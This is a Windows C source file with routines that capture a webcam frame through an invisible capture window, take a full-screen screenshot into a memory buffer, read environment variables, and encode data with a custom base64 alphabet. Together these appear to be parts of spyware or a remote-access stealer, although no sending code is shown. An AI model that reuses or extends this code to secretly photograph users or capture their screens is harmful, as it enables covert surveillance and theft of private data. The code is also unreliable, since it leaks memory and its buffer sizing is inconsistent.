#include <windows.h>
#include <vfw.h>
#include "DevApi.h"
#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessageW(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(WCHAR* szFile, int nIndex, int nX, int nY, int nMsg)
{
	HWND hWndCap = capCreateCaptureWindowW(L"CapWebCam", WS_CHILD, 0, 0, nX, nY, GetDesktopWindow(), 0);
	if (!hWndCap) return FALSE;

	if (!capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, nIndex, 0)) {
		DestroyWindow(hWndCap); return FALSE;
	}

	CAPDRIVERCAPS capDriverCaps;
	memset(&capDriverCaps, 0, sizeof(CAPDRIVERCAPS));
	capSendMessage(hWndCap, WM_CAP_DRIVER_GET_CAPS, sizeof(CAPDRIVERCAPS), &capDriverCaps);
	if (!capDriverCaps.fCaptureInitialized) {
		DestroyWindow(hWndCap); return FALSE;
	}

	capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
	capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
	capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIBW, 0, szFile);
	capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
	DestroyWindow(hWndCap);

	return TRUE;
}

int GetCamIndex()
{
	char szDeviceName[80];
	char szDeviceVersion[80];

	for (int wIndex = 0; wIndex < 9; wIndex++)
	{
		if (capGetDriverDescriptionA(wIndex, szDeviceName, sizeof(szDeviceName),
			szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
	}
	return -1;
}

void doWebcamera(WCHAR* szPath) {
	int nIndex = GetCamIndex();
	if (nIndex == -1)
		return;

	capWebCam(szPath, nIndex, 640, 480, 10);
}

PCWCHAR getEnvW(PCWCHAR env) {
	WCHAR* mem = (WCHAR*)malloc(32767 * sizeof(WCHAR));
	GetEnvironmentVariableW(env, mem, 32767);
	return mem;
}

LPSTR custom_base64Encode(LPBYTE source, SIZE_T sourceSize, SIZE_T *destSize)
{
	static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
	LPBYTE dest = (LPBYTE)malloc((sourceSize + 2) / 3 * 4 + 1);
	if (dest)
	{
		LPBYTE p = dest;
		BYTE cur[3];

		while (sourceSize > 0)
		{
			DWORD len = 0;
			for (DWORD i = 0; i < 3; i++)
			{
				if (sourceSize > 0)
				{
					sourceSize--;
					len++;
					cur[i] = source[i];
				}
				else cur[i] = 0;
			}

			source += 3;

			p[0] = cb64[cur[0] >> 2];
			p[1] = cb64[((cur[0] & 0x03) << 4) | ((cur[1] & 0xF0) >> 4)];
			p[2] = (BYTE)(len > 1 ? cb64[((cur[1] & 0x0F) << 2) | ((cur[2] & 0xC0) >> 6)] : '.');//. = =
			p[3] = (BYTE)(len > 2 ? cb64[cur[2] & 0x3F] : '.');//. = =

			p += 4;
		}

		*p = 0;
		if (destSize)*destSize = (SIZE_T)(p - dest);
	}

	return (LPSTR)dest;
}

PBYTE doScreenshot(DWORD* dw)
{
	HDC hdcScr, hdcMem;
	HBITMAP hbmScr;
	BITMAP bmp;
	int iXRes, iYRes;

	hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
	hdcMem = CreateCompatibleDC(hdcScr);
	iXRes = GetDeviceCaps(hdcScr, HORZRES);
	iYRes = GetDeviceCaps(hdcScr, VERTRES);
	hbmScr = CreateCompatibleBitmap(hdcScr, iXRes, iYRes);
	if (hbmScr == 0) return 0;
	if (!SelectObject(hdcMem, hbmScr)) return 0;
	if (!StretchBlt(hdcMem, 0, 0, iXRes, iYRes, hdcScr, 0, 0, iXRes, iYRes, SRCCOPY)) return 0;

	PBITMAPINFO pbmi;
	WORD cClrBits;

	if (!GetObjectW(hbmScr, sizeof(BITMAP), (LPSTR)&bmp)) return 0;

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1) cClrBits = 1;
	else if (cClrBits <= 4) cClrBits = 4;
	else if (cClrBits <= 8) cClrBits = 8;
	else if (cClrBits <= 16) cClrBits = 16;
	else if (cClrBits <= 24) cClrBits = 24;
	else cClrBits = 32;
	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));

	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24) pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8
		* pbmi->bmiHeader.biHeight * cClrBits;
	pbmi->bmiHeader.biClrImportant = 0;

	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;
	LPBYTE lpBits;
	DWORD dwTotal;
	DWORD cb;
	BYTE *hp;

	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits) return 0;
	if (!GetDIBits(hdcMem, hbmScr, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS)) return 0;

	hdr.bfType = 0x4d42;
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);

	*dw = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
	PBYTE screenMem = (PBYTE)malloc(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biSizeImage + (sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD)));
	memcpy(screenMem, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER));
	memcpy(screenMem + sizeof(BITMAPFILEHEADER), (LPVOID)pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD));

	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	memcpy(screenMem + sizeof(BITMAPFILEHEADER) + (sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD)), (LPSTR)hp, (int)cb);

	GlobalFree((HGLOBAL)lpBits);
	ReleaseDC(0, hdcScr);
	ReleaseDC(0, hdcMem);

	return screenMem;
}